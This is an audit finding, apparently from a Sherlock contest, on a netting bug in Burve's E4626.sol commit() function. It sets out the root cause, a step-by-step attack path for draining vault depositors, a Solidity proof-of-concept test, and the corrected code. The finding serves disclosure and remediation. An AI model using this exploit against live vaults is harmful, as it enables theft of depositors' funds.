# Attacker could steal underlying assets from ERC-4626 vault depositors with commit function

### Summary

The incorrect net-off calculation in E4626.sol::commit() will cause a complete loss of funds for vault depositors, as an attacker will withdraw more assets than they deposit in a single batch without paying the difference.

### Root Cause

https://github.com/sherlock-audit/2025-04-burve/blob/main/Burve/src/multi/vertex/E4626.sol#L62

> In [`[src/multi/vertex/E4626.sol:62-78](https://github.com/sherlock-audit/2025-04-burve/blob/main/Burve/src/multi/vertex/E4626.sol#L71)`](https://github.com/sherlock-audit/2025-04-burve/blob/main/Burve/src/multi/vertex/E4626.sol#L71) the code zeroes `assetsToDeposit` **before** subtracting it from `assetsToWithdraw`.
>
> ```solidity
> } else if (assetsToWithdraw > assetsToDeposit) {
> assetsToDeposit = 0;                    // ← sets to 0 first
> assetsToWithdraw -= assetsToDeposit;    // ← no longer subtracts anything
> }
> ```

As a result, when `assetsToWithdraw > assetsToDeposit`, the contract never deposits the promised amount but still withdraws the full requested amount from the underlying ERC-4626 vault.

### Internal Pre-conditions

1. **Attacker** can call `deposit(cid, amount)` and `withdraw(cid, amount)` for the same `cid` before `commit()` is executed.
2. `assetsToWithdraw` must be **strictly greater** than `assetsToDeposit` in that batch.

### External Pre-conditions

The underlying ERC-4626 vault holds sufficient liquid assets to satisfy the withdrawal.

### Attack Path

1. Attacker calls `deposit(cid, x)` (small amount, e.g. `1e17`).
2. Immediately afterwards, in the same transaction, attacker calls `withdraw(cid, y)` with `y > x` (e.g. `5e17`).
3. Attacker (or a higher-level contract) calls `commit()`.
4. Inside `commit()` the bugged branch executes:

    * `assetsToDeposit` is set to 0 ⇒ **no deposit made**.
    * `assetsToWithdraw` remains `y` ⇒ **full withdrawal executed**.
5. Transaction completes.

    * Attacker receives `y` tokens.
    * Attacker’s “deposit” of `x` tokens never reached the vault but they still retain the new shares credited during the earlier `deposit()` call.

### Impact

Vault depositors suffer an approximate loss of y tokens per exploit, while the attacker gains y – x tokens net (effectively the entire amount they claimed to deposit). Repeating the attack drains the vault until its liquidity is exhausted, leaving remaining users unable to withdraw (DoS) and with their shares permanently devalued.

### PoC

add test in test/multi/E4626.t.sol

```sol
function testNettingExploit() public {
    // -----------------------------------  Preparation  -----------------------------------
    ClosureId cid = ClosureId.wrap(1);
    uint256 initialDeposit = 1e18;  // Make an initial normal deposit to obtain shares
    {
        VaultTemp memory tmp;
        vault.fetch(tmp);
        vault.deposit(tmp, cid, initialDeposit);
        vault.commit(tmp);
    }

    // Record the baseline account balance and the vault’s total assets
    uint256 balBefore    = token.balanceOf(address(this));
    uint256 assetsBefore = e4626.totalAssets();  // MockERC4626 conforms to ERC-4626

    // -----------------------------------  Exploitation  -----------------------------------
    uint256 fakeDeposit  = 1e17;  // Attacker claims to deposit this amount
    uint256 realWithdraw = 5e17;  // And withdraws a larger amount (> fakeDeposit) in the same batch

    VaultTemp memory temp;
    vault.fetch(temp);
    vault.deposit(temp, cid, fakeDeposit);   // Triggers the flawed net-off branch
    vault.withdraw(temp, cid, realWithdraw); // assetsToWithdraw > assetsToDeposit
    vault.commit(temp);                      // Executes the buggy logic

    // -----------------------------------  Assertions  -----------------------------------
    uint256 balAfter = token.balanceOf(address(this));
    uint256 profit   = balAfter - balBefore;
    assertEq(
        profit,
        realWithdraw,
        "Net gain equals the full withdrawal; fakeDeposit was not deducted"
    );

    // The underlying vault’s total assets should decrease only by the withdrawal,
    // with no increase for fakeDeposit
    uint256 assetsAfter = e4626.totalAssets();
    assertEq(
        assetsAfter,
        assetsBefore - realWithdraw,
        "Underlying vault lost the withdrawal amount and received no fakeDeposit"
    );
}
```

### Mitigation

1. **Fix the netting logic** in `commit()`:

    ```solidity
    } else if (assetsToWithdraw > assetsToDeposit) {
        assetsToWithdraw -= assetsToDeposit;   // subtract first
        assetsToDeposit  = 0;
    }
    ```
